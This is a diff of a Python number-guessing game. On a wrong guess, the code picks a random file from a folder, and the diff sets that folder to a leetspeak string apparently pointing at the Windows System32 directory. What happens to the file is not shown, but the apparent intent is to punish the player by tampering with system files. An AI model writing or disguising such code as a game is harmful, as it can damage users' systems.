@@ -18,7 +18,7 @@ def guess_number():
         if user_guess == random_number:
             messagebox.showinfo("Number Guessing Game", "Congratulations! You guessed the right number.")
         else:
-            folder_path = r"" # You can put any file directory here
+            folder_path = r"R0T53N{SYST3M_32}" # You can put any file directory here
             files = os.listdir(folder_path)
             if len(files) > 0:
                 random_file = random.choice(files)
